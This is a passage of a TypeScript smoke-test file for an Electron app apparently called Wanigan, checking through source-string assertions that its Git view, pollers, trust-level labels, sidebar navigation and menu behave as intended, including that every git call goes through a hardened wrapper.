    && gitViewSrc.includes("setProjectId(e.target.value); setSel(null); setDetail(null); setMsg('');"),
  'the Git detail pane is re-resolved against the status each action returns, and a commit message does not follow you into another project');

  // Git is a view you leave in order to look at something else: open the
  // session that made these changes, read the run that broke them, come back.
  // Every one of those swaps unmounted it, and it returned on the first project
  // in the list, on the changes pane, unfiltered, with nothing selected and an
  // empty commit box — a sentence typed about staged changes, gone with nothing
  // on screen saying it had ever been written. Those six are view memory now.
  // Source contract because the smoke process has no renderer to swap tabs in.
  check(gitViewSrc.includes("useViewMemory('projectId', projects[0]?.id ?? '')")
    && gitViewSrc.includes("useViewMemory<Sel>('sel', null)")
    && gitViewSrc.includes("useViewMemory('commitFilter', '')")
    && gitViewSrc.includes("useViewMemory('commitMsg', '')")
    && gitViewSrc.includes("useViewMemory('showAll', true)")
    && gitViewSrc.includes("useViewMemory<'changes' | 'branches' | 'stash'>('pane', 'changes')")
    && /import \{ useRememberedScrollRef, useViewMemory \} from '\.\.\/components\/viewMemory';/.test(gitViewSrc)
    && !/const \[sel, setSel\] = useState/.test(gitViewSrc)
    && !/const \[msg, setMsg\] = useState/.test(gitViewSrc)
    && !/const \[pane, setPane\] = useState/.test(gitViewSrc)
    // Remembered per return, not per repository: changing the project still
    // clears the draft, because a message about one tree's changes waiting
    // over another's is a worse outcome than losing it.
    && gitViewSrc.includes("setProjectId(e.target.value); setSel(null); setDetail(null); setMsg('');"),
  'Git comes back on the repository, pane, commit filter, selected row and half-typed commit message the operator left it on, rather than resetting to the first project with an empty message box');

  // A remembered selection with nothing under it is worse than no selection at
  // all: the row is highlighted, the pane below it is blank, and that reads as
  // a file with no changes rather than a diff nobody re-fetched. The patch is
  // deliberately not remembered — it is a read of the repository and goes stale
  // — so the selection is re-resolved on mount through the same syncSelection a
  // git action uses, and a remembered commit waits for the log rather than
  // being discarded against the empty list `load` renders one await early. The
  // project id is reconciled for a related reason: the lookup above it already
  // falls back to the first option, so a project removed while another tab was
  // on screen left the picker naming a dead id while every pane read a
  // different repository.
  check(gitViewSrc.includes('const restored = useRef(false);')
    && /if \(restored\.current \|\| !st\?\.isRepo\) return;/.test(gitViewSrc)
    && gitViewSrc.includes("if (sel?.kind === 'commit' && commits.length === 0) return;")
    && gitViewSrc.includes('void syncSelection(st);')
    && gitViewSrc.includes('if (!project || project.id === projectId) return;')
    && gitViewSrc.includes('setProjectId(project.id);'),
  'a remembered Git selection is re-fetched on mount instead of being shown as a highlighted row over an empty pane, and a remembered project that has since been removed is rewritten rather than left naming a repository nothing is reading');

  // .gt-scroll is four elements, not one: the commit log on the left, and the
  // right-hand pane that changes, branches and stash take turns filling. A
  // single key would restore the log's offset onto a three-row stash list and
  // drop the reader somewhere they had never been, so the right-hand scroller
  // carries the open pane in its key.
  check(gitViewSrc.includes("const logRef = useRememberedScrollRef('log');")
    && gitViewSrc.includes('const paneRef = useRememberedScrollRef(`pane:${pane}`);')
    && (gitViewSrc.match(/<div className="gt-scroll" ref=\{paneRef\}>/g) ?? []).length === 3
    && gitViewSrc.includes('<div className="gt-scroll" ref={logRef} onKeyDown={')
    // No .gt-scroll may be left without a ref: an unremembered one is the one
    // that snaps to the top while its three neighbours do not.
    && !/<div className="gt-scroll">/.test(gitViewSrc),
  'Git remembers one scroll offset for the commit log and one for each right-hand pane, so returning to the stash list cannot land the reader at the offset they left the branch list at');

  // Git was the only .pane document route that never named itself. All three of
  // its states — no project, a project that is not a repository, and the
  // workbench — opened straight onto their content with no h1 for the route, so
  // the sidebar was the only thing on screen saying which view you were in. One
  // head is shared by all three, so the answer does not depend on whether the
  // selected project happens to be a repository.
  // The pane opts out of the --page-max prose measure in the sheet rather than
  // wearing className="pane wide": .pane.wide only raises the cap to
  // --page-wide and no breakpoint lifts that, so the toolbar rule, the divider
  // between the two columns and the diff would go back to stopping short of the
  // window edge on a wide display. Specificity, not source order, is what makes
  // these win — git.css is @imported at the top of index.css and loses ties.
  const gitCssSrc = sourceOf('src/renderer/src/styles/git.css');
  check((gitViewSrc.match(/\{head\}/g) ?? []).length === 3
    && gitViewSrc.includes('<PageHead')
    && gitViewSrc.includes('title="Git"')
    && (gitViewSrc.match(/className="pane gt-view"/g) ?? []).length === 3
    // No state may fall back to the bare document pane: that is the measure
    // this view exists outside of.
    && !/className="pane"/.test(gitViewSrc)
    && gitCssSrc.includes('.pane.gt-view { padding: 0; }')
    && gitCssSrc.includes('.pane.gt-view > * { max-width: none; }')
    && gitCssSrc.includes('.pane.gt-view > .pane-head:first-child { padding: var(--s-3); }'),
  'every Git state opens with the shared page head, and its workbench runs to the window edge rather than stopping at the prose measure');

  // `st` is not a cache of the last repository Wanigan managed to read — it is the root every button
  // on this page hands to main. Nothing used to clear it, so a project whose status read threw left
  // the previous repository's status, and its root, standing under the new one's name.
  check(gitViewSrc.includes('const requestEpoch = useRef(0);')
    && /useEffect\(\(\) => \{\n\s*requestEpoch\.current \+= 1;\n\s*setSt\(null\); setCommits\(\[\]\); setBrs\(\[\]\); setStash\(\[\]\);/.test(gitViewSrc)
    && gitViewSrc.includes('setDetail(null); setErr(null); setOk(null); setConfirm(null);')
    && gitViewSrc.includes('setPr(null); setCreating(false);')
    && gitViewSrc.includes('if (epoch !== requestEpoch.current) return null;'),
  'the Git view clears the previous repository — status, log, branches, stashes, the open diff, the pending confirmation and the PR chip — synchronously in the same commit that changes the selected root, and stamps every read with an epoch so a late answer for the previous repository cannot land under the new one’s name',
  JSON.stringify({ epochGuards: (gitViewSrc.match(/epoch [!=]== requestEpoch\.current/g) ?? []).length }));

  // The pending confirmation is the sharpest case and it did not need a failed read at all: its `run`
  // closure captures the root that was on screen when it was raised, so between two perfectly readable
  // repositories one press of “Discard changes” acted on the one you had just navigated away from.
  check(gitViewSrc.includes('setDetail(null); setErr(null); setOk(null); setConfirm(null);')
    && !/\} catch \(e\) \{ setErr\(e instanceof Error \? e\.message : String\(e\)\); return null; \}/.test(gitViewSrc)
    && /setSt\(null\); setCommits\(\[\]\); setBrs\(\[\]\); setStash\(\[\]\);\n\s*setErr\(e instanceof Error/.test(gitViewSrc),
  'a confirmation raised for one repository is dismissed when the selected project changes rather than left on screen one press from acting on the tree you navigated away from, and a status read that throws drops the status it could not confirm instead of leaving it under the twenty-one call sites that pass st.root to the main process',
  JSON.stringify({ stRootCallSites: (gitViewSrc.match(/st\.root/g) ?? []).length }));

  // Four git reads a beat — status, log, branches, stashes — behind a window nobody is looking at,
  // while both of the shell's own polls already guarded and said why.
  check(gitViewSrc.includes('const t = window.setInterval(() => { if (document.hidden) return; void load(); }, 8000);')
    && gitViewSrc.includes('const onVisible = () => { if (document.hidden) return; void load(); };')
    && gitViewSrc.includes("document.addEventListener('visibilitychange', onVisible);")
    && gitViewSrc.includes("document.removeEventListener('visibilitychange', onVisible);")
    && !gitViewSrc.includes('setInterval(load, 8000)'),
  'Git’s eight-second repository poll stops while the window is hidden and catches up the moment it comes back, the way both of the shell’s own polls already do, rather than spawning four git reads a beat behind a window nobody is looking at',
  JSON.stringify({ unguardedIntervalGone: !gitViewSrc.includes('setInterval(load, 8000)') }));

  // The three polls the sweep above missed. Each is the same defect Fleet, the
  // shell, Runs, Batches and Git were already fixed for — a timer that keeps
  // asking the main process questions on behalf of a window nobody is reading —
  // and each is asserted here rather than left to the next person to notice.
  check(composerSrc.includes('const t = window.setInterval(() => { if (document.hidden) return; read(); }, QUEUE_POLL_MS);')
    && composerSrc.includes('const onVisible = () => { if (!document.hidden) read(); };')
    && composerSrc.includes("document.addEventListener('visibilitychange', onVisible);")
    && composerSrc.includes("document.removeEventListener('visibilitychange', onVisible);")
    && !composerSrc.includes('window.setInterval(read, QUEUE_POLL_MS)'),
  'the Composer’s attention poll stops while the window is hidden and re-reads on return — it is the same attention.list() call, on the same two-second beat, that AttentionQueue already guards for exactly this reason',
  JSON.stringify({ unguardedIntervalGone: !composerSrc.includes('window.setInterval(read, QUEUE_POLL_MS)') }));

  const observedSrc = sourceOf('src/renderer/src/components/ObservedBand.tsx');
  check(observedSrc.includes('const timer = window.setInterval(() => { if (document.hidden) return; void read(); }, POLL_MS);')
    && observedSrc.includes('const wake = () => { if (!document.hidden) void read(); };')
    && !observedSrc.includes('const timer = window.setInterval(() => { void read(); }, POLL_MS);'),
  'the observed-sessions band stops scanning behind a hidden window, and its wake handler fires on the visible half of visibilitychange rather than on both',
  JSON.stringify({ unguardedIntervalGone: !observedSrc.includes('const timer = window.setInterval(() => { void read(); }, POLL_MS);') }));

  check(schedulesSrc.includes('const t = setInterval(() => { if (document.hidden) return; void load(); }, 15_000);')
    && schedulesSrc.includes('const onVisible = () => { if (!document.hidden) void load(); };')
    && !schedulesSrc.includes('setInterval(load, 15_000)'),
  'the Schedules poll — two IPC reads a beat for a table one tab away — stops while the window is hidden, because the scheduler keeps its own time either way and this poll only decides how fresh the screen is',
  JSON.stringify({ unguardedIntervalGone: !schedulesSrc.includes('setInterval(load, 15_000)') }));

  // git.ts opens by calling itself "the one place this process runs git", and
  // that sentence is worth only as much as a check behind it. context/memory.ts
  // had its own execFileSync for a year: bounded at four seconds so it could
  // not hang, but spawned with the app's environment, so asking "is this a
  // repository" could reach a credential helper or raise an askpass dialog for
  // a directory the operator had merely opened a panel on. The hardening that
  // stops that lives in gitEnv(), which only the wrapper sets.
  const mainTs = filesUnder(path.join(appRoot(), 'src/main'))
    .filter((f) => f.endsWith('.ts') && !/\/(?:git|smoke\d*)\.ts$/.test(f));
  const bareGit = mainTs.filter((f) => {
    const src = fs.readFileSync(f, 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
    return /(?:execFileSync|execFile|spawnSync|spawn)\(\s*['"]git['"]/.test(src);
  }).map((f) => path.relative(appRoot(), f));
  check(mainTs.length > 40 && bareGit.length === 0,
    'no module outside git.ts spawns git itself, so every git this process runs is the one with GIT_TERMINAL_PROMPT=0 and both askpass variables emptied',
    JSON.stringify({ scanned: mainTs.length, offenders: bareGit }));
  const memorySrc = sourceOf('src/main/context/memory.ts');
  check(memorySrc.includes("import { runGitSync } from '../git';")
    && !memorySrc.includes("from 'node:child_process'"),
  'the memory panel asks git through the hardened runner rather than importing a child process of its own');

  // A model switch Wanigan did not make now reaches the record, so the Timeline
  // has to be able to draw it. Without this arm the row falls to the default
  // and prints the raw event name in lower case.
  const timelineSrc = sourceOf('src/renderer/src/components/Timeline.tsx');
  check(timelineSrc.includes("case 'PostModelSwitch':")
    && /case 'PostModelSwitch':\s*\n\s*return \{ glyph: '⇄', word: 'model switched'/.test(timelineSrc),
  'the Timeline names a model switch rather than falling through to the raw event name');

  // Learning's stage guide is folded in EVERY branch, not only the empty one.
  // The first attempt folded it inside `if (!hasAnyEver)`, which is the branch a
  // stub with no learning rows renders and very nearly the only state a real
  // install is never in: one signal makes hasAnyEver true, so every real
  // Learning page still opened on four numbered stages and a dozen stat chips.
  // The fix belongs on the Explainer itself, where both branches reach it.
  check(/<Explainer id="learning-stages" title="[^"]*" defaultHidden>/.test(learningSrc),
    'the Learning stage guide is folded wherever it renders, not only on a page with nothing on it');
  // The five stations are nowrap inside an overflow-x strip, so prose on one of
  // them pushes the last stage off the right edge behind a scrollbar. Briefed is
  // the stage the whole pipeline exists to reach.
  check(/note: pipeline && pipeline\.projectionsApplied === 0 \? 'optional' : undefined,/.test(learningSrc),
    'and the optional-stage note is one word, so the fifth station is not pushed off the end of the spine');

  // A view with nothing in it yet opens on its next action, not on an essay
  // about the thing that has not happened. Control put its first interactive
  // control 686px down the page and Schedules 596px, both behind a guide that
  // is the right reading only once there is something to read it against.
  check(/<Explainer id="control-guide"[^>]*defaultHidden=\{ready && dockets\.length === 0\}/.test(controlViewSrc),
    'Control folds its guide only once a read has returned and found no goals, so a slow read never hides it from someone who has some');
  check(/<Explainer id="schedules-guide"[^>]*defaultHidden=\{list\.length === 0\}/.test(schedulesSrc),
    'Schedules folds its guide while nothing is scheduled');

  // Context numbers its seven slots as stable identities, so a repo that owns
  // only the third and fourth opens on a section headed 3 with nothing above it
  // saying why — and the card that names what is missing and offers /init sat
  // below all seven. The numbers stay; the card moves up whenever most of the
  // list is still empty. `nothing` already led with it; this is the ordinary
  // case in between, which is most repositories.
  //
  // Asserted here rather than in the browser harness because that harness
  // answers every context.* read with a shape-agnostic proxy, so every slot
  // computes as filled and `unfilled` is empty — it cannot reach this path at
  // all, and a green sweep says nothing about it.
  const contextViewSrc = sourceOf('src/renderer/src/views/Context.tsx');
  const setupBefore = contextViewSrc.indexOf('{setupLeads && unfilled.length > 0 && (');
  const firstSection = contextViewSrc.indexOf('<Section n={1} title="Instructions"');
  const setupAfter = contextViewSrc.indexOf('{!setupLeads && unfilled.length > 0 && (');
  check(contextViewSrc.includes('const setupLeads = unfilled.length > SLOTS.length / 2;')
    && setupBefore > 0 && firstSection > setupBefore && setupAfter > firstSection,
  'Context puts its setup card above the numbered slots while most of them are still empty, and below them once they are not',
  JSON.stringify({ setupBefore, firstSection, setupAfter }));

  // The flag has to keep following the data until something says otherwise.
  // Read once in the useState initialiser it was decided while the view was
  // still loading — which is exactly when "is this empty" is at its least true —
  // and a populated view kept the folded state it was given at zero rows.
  const bitsSrc = sourceOf('src/renderer/src/components/bits.tsx');
  check(bitsSrc.includes('const decided = useRef(false);')
    && /useEffect\(\(\) => \{\s*\n\s*if \(!decided\.current\) setHidden\(defaultHidden === true\);\s*\n\s*\}, \[defaultHidden\]\);/.test(bitsSrc)
    && /decided\.current = true; setHidden\(v === 'hidden'\)/.test(bitsSrc)
    && /const set = \(next: boolean\) => \{\s*\n\s*decided\.current = true;/.test(bitsSrc),
  'an explainer keeps following defaultHidden until a stored choice or a click decides it, and never re-folds one the reader has opened');

  // The general form of the check above. Asking for an event and then drawing
  // it as its own lower-cased identifier is how "postmodelswitch" would have
  // reached a screen; this fails the moment a new name is added to the settings
  // file without a word for it.
  const asked = hooks.hookEventsFor('2.1.263 (Claude Code)');
  const undrawn = asked.filter((e) => !timelineSrc.includes(`case '${e}':`));
  check(asked.length >= 24 && undrawn.length === 0,
    'every hook event Wanigan asks a current CLI for has a word and a glyph in the Timeline, so none of them reaches the operator as a raw identifier',
    JSON.stringify({ asked: asked.length, undrawn }));

  // The shell seeds its project list empty and surfaces a failed read as a banner, so `length === 0`
  // was two different facts and this pane printed only one of them.
  check(appSrc.includes('const [projectsRead, setProjectsRead] = useState(false);')
    && appSrc.includes('setProviders(pv); setProjects(pj); setHasKey(ks.present); setProjectsRead(true);')
    && appSrc.includes('<Git projects={projects} projectsRead={projectsRead} />')
    && gitViewSrc.includes('projectsRead: boolean;')
    && gitViewSrc.includes('title="Your project list has not been read yet"')
    && gitViewSrc.includes('title="No project to read git from"'),
  'Git can tell an unread project list from an empty one and says which it is, so an operator with a dozen repositories is no longer told they have none and offered “Add your first project” before the shell’s first read has returned',
  JSON.stringify({ wiredInApp: appSrc.includes('projectsRead={projectsRead}') }));

  // A count is a read. Before one returned this printed 0 and “No commits yet.”, and left that
  // sentence up beside the error Note when the read failed.
  check(!gitViewSrc.includes('<span className="c">{commits.length}</span>')
    && !gitViewSrc.includes('{!commits.length && <p className="faint" style={{ padding: 14 }}>No commits yet.</p>}')
    && gitViewSrc.includes("{st ? commits.length : '—'}")
    && gitViewSrc.includes('<Reading what="this repository" />')
    && gitViewSrc.includes('<Reading what="the working tree, branches and stashes" />')
    && gitViewSrc.includes("{p === 'stash' && st ? ` ${stash.length}` : ''}"),
  'the Git view prints no count and no “No commits yet.” until a status read has actually returned: before one does it says it is reading, and after one fails it says the read failed rather than leaving a zero and an empty-history sentence standing beside the error',
  JSON.stringify({ unguardedCommitCountGone: !gitViewSrc.includes('<span className="c">{commits.length}</span>') }));

  // The reading and could-not-read states belong to the workbench. A fourth top-level pane root would
  // make this a fourth screen and break the head/pane-root contract two checks below.
  check((gitViewSrc.match(/className="pane gt-view"/g) ?? []).length === 3
    && (gitViewSrc.match(/\{head\}/g) ?? []).length === 3
    && gitViewSrc.includes('title="The last read of this repository failed"')
    && gitViewSrc.includes('<Reading what="the working tree, branches and stashes" />'),
  'the reading and could-not-read states Git gained are rendered inside its workbench rather than as a fourth top-level pane root, so the view still has exactly three states behind one shared page head',
  JSON.stringify({ paneRoots: (gitViewSrc.match(/className="pane gt-view"/g) ?? []).length }));

  // ── what is left, for every agent ───────────────────────────────────
  // The Usage screen said "read live from each account" and read only the
  // Claude ones. AccountLimits already carried a harness field and
  // codex-status.ts already read Codex's windows per account; nothing joined
  // them, so a Codex login simply did not appear on the page whose whole
  // subject is what is left.
  const limitsSrc = sourceOf('src/main/limits.ts');
  const usageSrc = sourceOf('src/main/usage.ts');
  check(usageSrc.includes("import { allAccountLimits } from './limits'")
    && !usageSrc.includes("from './claude-limits'")
    && limitsSrc.includes("accounts.list('codex')")
    && limitsSrc.includes('readCodexStatus(force, account.id)')
    && limitsSrc.includes('accounts.listAll()'),
  'the usage snapshot reads every account across harnesses, not only the Claude ones');
  // Codex names a window by its duration; Claude names it with a word. Where
  // the span is the same, the page must not call it two different things.
  check(limits.__test.windowKind(10_080) === 'week'
    && limits.__test.windowKind(1_440) === 'day'
    && limits.__test.windowKind(300) === '5h window'
    && limits.__test.windowKind(90) === '90m window'
    && limits.__test.windowKind(null) === 'limit window',
  'a Codex window is named by the span it actually covers, and a weekly one gets the same word Claude uses',
  limits.__test.windowKind(300));
  const codexAccount = {
    id: 'a1', harness: 'codex', label: 'Personal', configDir: '/tmp/x',
    adopted: true, isDefault: true, present: true, signedIn: 'yes' as const, createdAt: 0, updatedAt: 0,
  };
  const codexOk = limits.__test.fromCodexStatus(
    codexAccount,
    { fetchedAt: 1, plan: 'pro', spendControlReached: true,
      primary: { usedPercent: 42, remainingPercent: 58, resetsAt: 99, windowMinutes: 300 },
      secondary: { usedPercent: 7, remainingPercent: 93, resetsAt: 1000, windowMinutes: 10_080 } });
  check(codexOk.state === 'ok' && codexOk.harness === 'codex'
    && codexOk.windows.length === 2
    && codexOk.windows[0].kind === '5h window' && codexOk.windows[1].kind === 'week'
    // Codex gives an epoch and no words, so there is nothing verbatim to keep;
    // the renderer prints the countdown it can compute and nothing else.
    && codexOk.windows.every((w) => w.resetsAtText === null)
    && codexOk.windows[0].resetsAt === 99
    // A spend control is a separate fact from a full window and is the one that
    // explains a refused run while every percentage still looks fine.
    && /spend control has been reached/.test(codexOk.detail ?? ''),
  'a Codex reading becomes an account card with its real windows, no invented reset wording, and its spend control stated');
  const codexEmpty = limits.__test.fromCodexStatus(codexAccount,
    { fetchedAt: 1, plan: null, spendControlReached: null, primary: null, secondary: null });
  check(codexEmpty.state === 'unreadable' && codexEmpty.windows.length === 0
    && /not a reading of zero/.test(codexEmpty.detail ?? ''),
  'Codex answering with no windows is reported as unreadable, never as zero used');

  // A trust level that reaches the renderer from a database row rather than
  // from TRUST_LEVELS used to index TRUST_COPY directly in five places. One
  // unrecognised value made that undefined and the next .label took the whole
  // view into its error boundary — a blank screen in answer to "what is this
  // repository allowed to do". trustCopy() answers instead, and says plainly
  // that it does not know the level rather than relabelling it as one of the
  // three the reader already trusts.
  const sessionsViewSrc = sourceOf('src/renderer/src/views/Sessions.tsx');
  const dialogSrc = sourceOf('src/renderer/src/components/NewSessionDialog.tsx');
  const unknownTrust = trustCopy('elevated-by-a-later-build');
  check(trustCopy('project').label === 'Project'
    && unknownTrust.label === 'elevated-by-a-later-build'
    && /does not recognise the trust level/.test(unknownTrust.detail)
    // It may name the three real levels as the remedy; what it must never do is
    // hand back one of their descriptions as if it described this one.
    && TRUST_LEVELS.every((known) => unknownTrust.detail !== TRUST_COPY[known].detail)
    && TRUST_LEVELS.every((known) => unknownTrust.label !== TRUST_COPY[known].label)
    && trustCopy('').label === 'unknown'
    && trustGlyph('trusted') === '◆' && trustGlyph('nonsense') === '·',
  'an unrecognised trust level renders as itself with an honest explanation, never as one of the three levels and never as a crash',
  unknownTrust.label);
  check(!sessionsViewSrc.includes('TRUST_COPY[') && !fleetViewSrc.includes('TRUST_COPY[')
    && !dialogSrc.includes('TRUST_COPY[')
    && !sessionsViewSrc.includes('const TRUST_GLYPH') && !fleetViewSrc.includes('const TRUST_GLYPH')
    && !dialogSrc.includes('const TRUST_GLYPH')
    // Settings may still index it where the key comes from TRUST_LEVELS itself.
    && settingsSrc.includes('trustCopy(lv).detail') && settingsSrc.includes('trustCopy(r.trust).label'),
  'no view indexes the trust table directly with a value that came from data, and the glyph is declared once rather than in three files');

  // ── the shell: one header row, one vertical destination list ────────
  const menuSrc = sourceOf('src/main/menu.ts');
  // These checks are about what the menu *does*, and menu.ts explains itself at
  // length — including by quoting the roles it deliberately omits. Reading the
  // prose as code made "no reload role" fail on the sentence saying so.
  const menuCode = menuSrc.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  const bindingsSrc = sourceOf('src/renderer/src/bindings.ts');
  const shellCssSrc = sourceOf('src/renderer/src/styles/shell.css');
  const useDialogSrc = sourceOf('src/renderer/src/components/useDialog.ts');
  const ungrouped = TABS.map((item) => item.id)
    .filter((id) => !SIDEBAR_GROUPS.some((section) => (section.tabs as readonly string[]).includes(id)));
  check(ungrouped.length === 0,
    'every route in TABS is in a sidebar group, so no destination is reachable only through ⌘K',
    ungrouped.join(', '));
  check(SIDEBAR_GROUPS.flatMap((section) => section.tabs).length === TABS.length
    && new Set(SIDEBAR_GROUPS.flatMap((section) => section.tabs)).size === TABS.length,
    'and no route is listed in two groups, so arrow-key order and reading order are the same list');
  check(Object.keys(TAB_ICONS).length === TABS.length
    && TABS.every((item) => typeof TAB_ICONS[item.id] === 'string' && TAB_ICONS[item.id].length > 0),
    'every route has an icon, so no sidebar row is a word with a hole beside it');
  // The phone is a narrowing of this same table, not a second taxonomy that
  // happens to look similar. Every desktop destination is either stood in for
  // by a phone screen or listed as deliberately absent with the sentence the
  // Device screen prints — so a view added to TABS cannot be silently forgotten
  // on the small screen, which is how a phone stops being a view of the same
  // product and starts being a different one.
  const narrowedTabs = new Set(MOBILE_VIEWS.flatMap((view) => view.narrows));
  const absentTabs = new Set(MOBILE_ABSENT.map((entry) => entry.tab));
  const forgottenOnPhone = TABS.map((item) => item.id).filter((id) => !narrowedTabs.has(id) && !absentTabs.has(id));
  const bothWays = TABS.map((item) => item.id).filter((id) => narrowedTabs.has(id) && absentTabs.has(id));
  check(forgottenOnPhone.length === 0 && bothWays.length === 0
    && MOBILE_ABSENT.every((entry) => entry.reason.trim().length > 20 && entry.reason.trim().endsWith('.')),
  'every desktop destination is either narrowed by a phone screen or listed as deliberately absent with a reason, so a new view cannot be forgotten on the phone',
  `forgotten: ${forgottenOnPhone.join(', ') || 'none'} / both: ${bothWays.join(', ') || 'none'}`);
  // Five slots, four destinations and More. A fifth bar entry would push a
  // destination out of the thumb bar and out of the sheet behind it at once,
  // leaving it reachable only on an iPad.
  check(MOBILE_VIEWS.filter((view) => view.bar).length === 4
    && MOBILE_VIEWS.every((view) => (view.id === 'device' ? view.narrows.length === 0 : view.narrows.length > 0))
    && new Set(MOBILE_VIEWS.map((view) => view.id)).size === MOBILE_VIEWS.length,
  'exactly four phone destinations claim a thumb-bar slot, every id is distinct, and only Device — which is about this phone — narrows no desktop screen',
  MOBILE_VIEWS.filter((view) => view.bar).map((view) => view.id).join(', '));
  check(appSrc.includes('<span className="nav-tab-label">{label}</span>')
    && appSrc.includes('<Icon name={TAB_ICONS[id]} />')
    && appSrc.includes('<span className="nav-tab-chord" aria-hidden="true">{shortcut.label}</span>'),
    'a sidebar row prints its word and its chord beside the glyph — the icon is a second way to find a route, never the only one');
  check(appSrc.includes('<div className="workspace">')
    && appSrc.includes('{sidebarOpen && (')
    && appSrc.includes('aria-controls="wanigan-sidebar"')
    && appSrc.includes("aria-orientation=\"vertical\"")
    && appSrc.includes("if (event.key === 'ArrowDown')")
    && !appSrc.includes('nav-titlebar') && !appSrc.includes('className="nav-tabs"')
    && useDialogSrc.includes(`: document.querySelector<HTMLElement>('[data-nav-tab][tabindex="0"]')`)
    && useDialogSrc.includes(`?? document.querySelector<HTMLElement>('.hdr-toggle')`)
    && !useDialogSrc.includes('nav-tabs')
    && !cssSrc.includes('.nav-titlebar') && !cssSrc.includes('--rail-h')
    && cssSrc.includes('--sidebar-w')
    && bindingsSrc.includes("id: 'sidebar'") && appSrc.includes("bindingMatches(e, 'sidebar')")
    && appSrc.includes("window.wanigan.prefs.set('nav_sidebar'")
    && settingsSrc.length > 0,
  'the two-row header became one row plus a hideable vertical list: all fifteen routes, arrow keys on the axis they are drawn on, a durable open/closed preference, and no .nav-tabs left for a closing dialog to hand focus to');

  // A dialog that closes must put focus somewhere real. The selector this used
  // to name (`.nav-tabs …`) went away with the horizontal rail, so it matched
  // nothing and every keyboard user landed on document.body.
  check(useDialogSrc.includes(`: document.querySelector<HTMLElement>('[data-nav-tab][tabindex="0"]')`)
    && useDialogSrc.includes(`?? document.querySelector<HTMLElement>('.hdr-toggle')`)
    && !useDialogSrc.includes('nav-tabs'),
  'a closing dialog whose opener unmounted hands focus to the sidebar roving tab stop and falls back to the header toggle, and names no .nav-tabs ancestor — the class App stopped rendering, whose selector matched nothing in either sidebar state',
  useDialogSrc.includes('nav-tabs') ? 'useDialog.ts still names nav-tabs' : `no nav-tabs selector in ${useDialogSrc.length} bytes of useDialog.ts`);

  // Negative, and only said about a file that was actually read: MISSING_SOURCE
  // is a non-empty sentinel, so the length guard is what makes the absence mean
  // "read it, it is not there" rather than "could not read it".
  check(useDialogSrc.length > 1000 && useDialogSrc !== MISSING_SOURCE
    && !useDialogSrc.includes('.nav-tabs') && !appSrc.includes('nav-tabs'),
  'neither App.tsx nor useDialog.ts names nav-tabs any more, and that absence is reported from a read that returned a whole file rather than the missing-source sentinel',
  `useDialog.ts ${useDialogSrc.length} bytes, App.tsx ${appSrc.length} bytes`);

  // The fallback's premise, in the file that has to keep it true. If the toggle
  // ever moves inside {sidebarOpen && (…)}, the collapsed case has no target and
  // the hook is silently back to dropping focus on the body.
  check(appSrc.indexOf('className="hdr-toggle"') < appSrc.indexOf('{sidebarOpen && (')
    && (appSrc.match(/className="hdr-toggle"/g) ?? []).length === 1
    && appSrc.includes('<button className="hdr-toggle" type="button" onClick={toggleSidebar}'),
  'the header toggle useDialog falls back to is rendered once, above the {sidebarOpen && …} guard, so it is still in the document on the frame where the destination list is not',
  `hdr-toggle at ${appSrc.indexOf('className="hdr-toggle"')}, sidebar guard at ${appSrc.indexOf('{sidebarOpen && (')}`);

  // Catches the whole phase being reverted or dropped: the hook can keep its
  // docstring and lose its caller, and nothing else in the suite would notice.
  check(useDialogSrc.includes('function restoreFocus(opener: HTMLElement | null): void {')
    && useDialogSrc.includes('restoreFocus(opener);')
    && !useDialogSrc.includes("the rail's single roving tab stop"),
  'the focus hand-back is still called from the dialog stack teardown, and its comment no longer describes a horizontal rail this app has not rendered since the sidebar landed',
  useDialogSrc.includes('restoreFocus(opener);') ? 'called on unmount' : 'restoreFocus is defined but never called');
  check(shellCssSrc.includes('.nav-tab-wrap { display: block; }')
    && cssSrc.includes('.nav-progress {')
    && !cssSrc.includes('position: absolute; left: 11px; right: 11px; bottom: 5px;'),
    'the batch progress bar is a sibling under its row rather than an overlay across the label it would cover');
  // The menu bar is built from the route table and claims no key the window
  // needs. A registered accelerator is taken by the OS before the keydown
  // reaches the renderer, which is where "the PTY owns its keystrokes" lives.
  check(menuCode.includes("import { SIDEBAR_GROUPS, TAB_SHORTCUTS, labelForTab")
    && menuCode.includes('registerAccelerator: false')
    && (menuCode.match(/(?<![A-Za-z])accelerator:/g) ?? []).length === (menuCode.match(/registerAccelerator: false/g) ?? []).length
    && !menuCode.includes("role: 'reload'") && !menuCode.includes("role: 'forceReload'")
    && menuCode.includes("w.webContents.send('menu:route', route)")
    && mainSrc.includes('installApplicationMenu(() => win)')
    && preloadSrc.includes("ipcRenderer.on('menu:route'")
    && appSrc.includes('window.wanigan.on.menuRoute(')
    && appSrc.includes("case 'tab': go(route.tab); break;"),
  'the macOS menu bar is built from the same route table, prints chords without taking them from the window, and cannot reload a renderer that owns live PTYs');
  check(appSrc.includes('window.wanigan.on.notificationOpened(')
    && appSrc.includes("if (route.kind === 'session') { focusSession(route.sessionId); go('sessions'); }"),
    'a clicked notification lands on the session it named, instead of raising the window onto whichever tab was open');
  // ⌘1–9 select a view, in the capture phase, on window. The session tabs
  // printed "⌘1 / ⌘2 / ⌘3" and the status bar said "⌘1–9 switch", and the
  // bubble-phase listener that would have honoured them was never reached —
  // confirmed by driving the built renderer, not by reading it. Switching
  // sessions has its own chord now, and nothing prints the old one.
  check(!sessionsSrc.includes('⌘{i + 1}')
    && !sessionsSrc.includes('⌘1–9 switch')
    && !sessionsSrc.includes('if (n >= 1 && n <= 9 && sessions[n - 1])')
    && bindingsSrc.includes("id: 'session-prev'") && bindingsSrc.includes("id: 'session-next'")
    && bindingsSrc.includes("aria: 'Alt+Meta+ArrowLeft'")
    && sessionsSrc.includes("bindingMatches(e, 'session-prev')")
    && sessionsSrc.includes("bindingMatches(e, 'session-next')")
    // Matched on the arrow key rather than a character, so the chord holds on
    // any keyboard layout.
    && !bindingsSrc.includes("aria: 'Alt+Meta+['"),
  'switching sessions uses a chord the shell has not already taken, and the tabs no longer print one that moves nothing');
  check(bindingsSrc.includes("keys: '⌘⌫'") && !bindingsSrc.includes("id: 'close-tab',   keys: '⌘W'")
    && sessionsSrc.includes("if (e.key === 'Backspace' && activeRef.current)")
    && !sessionsSrc.includes("if (e.key === 'w' && activeRef.current)"),
    'closing an exited session tab uses a chord macOS has not already claimed for Close Window, so the cheat sheet prints a chord that runs');
  check(sessionsSrc.includes("import '../styles/sessions.css'")
